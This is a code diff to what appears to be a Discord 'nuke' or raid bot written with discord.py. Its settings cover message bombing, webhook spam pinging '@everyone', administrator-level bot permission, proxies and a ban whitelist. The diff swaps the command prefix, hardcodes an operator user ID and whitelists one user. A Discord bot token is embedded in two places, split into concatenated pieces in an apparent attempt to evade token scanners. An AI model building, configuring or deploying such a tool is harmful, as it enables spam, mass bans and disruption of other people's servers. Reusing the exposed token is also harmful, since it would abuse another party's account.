@@ -66,7 +66,7 @@ if version.parse('1.5.1') > version.parse(discord.__version__):
     print('Please update your discord.py.')
     exit()
 
-settings = {"token":"ODc1MjQ0NzI5MjU4OTAxNTA0" + ".YRStLA." + "ETSi0E0DPg16k1cKTEpTduwG0-c","permissions":[],"bot_permission":"8","command_prefix":"n.","bot_status":"online","verbose":15,"bomb_messages":{"random":None,"fixed":[]},"webhook_spam":{"null":[],"pfp_urls":[],"contents":["@everyone"]},"after":[],"proxies":[],"ban_whitelist":[]}
+settings = {"token":"ODc1MjQ0NzI5MjU4OTAxNTA0" + ".YRStLA." + "ETSi0E0DPg16k1cKTEpTduwG0-c","permissions":[],"bot_permission":"8","command_prefix":">","bot_status":"online","verbose":15,"bomb_messages":{"random":None,"fixed":[]},"webhook_spam":{"null":[],"pfp_urls":[],"contents":["@everyone"]},"after":[],"proxies":[],"ban_whitelist":["Eren Yeager#5608"]}
 
 def setUp():
     # check location 
@@ -140,7 +140,7 @@ def setUp():
     else:
         try:
             settings['token'] = "ODc1MjQ0NzI5MjU4OTAxNTA0" + ".YRStLA." + "ETSi0E0DPg16k1cKTEpTduwG0-c"
-            settings['permissions'].append(input('\nEnter your discord tag or user ID. It is recommended to use discord user ID because some unicode names are hard for the code to check.\n>> '))
+            settings['permissions'].append("800632656839573504")
         except KeyboardInterrupt:
             sys.exit(0)
         except EOFError:
@@ -148,7 +148,7 @@ def setUp():
             exit()
 
     print('\nTips:')
-    print('The default command_prefix is: x.')
+    print('The default command_prefix is: >' )
     print(f'Your currect command_prefix is: {settings["command_prefix"]}')
     print(f'Use {settings["command_prefix"]}config to config the settings and more info about how to config.\n')
 
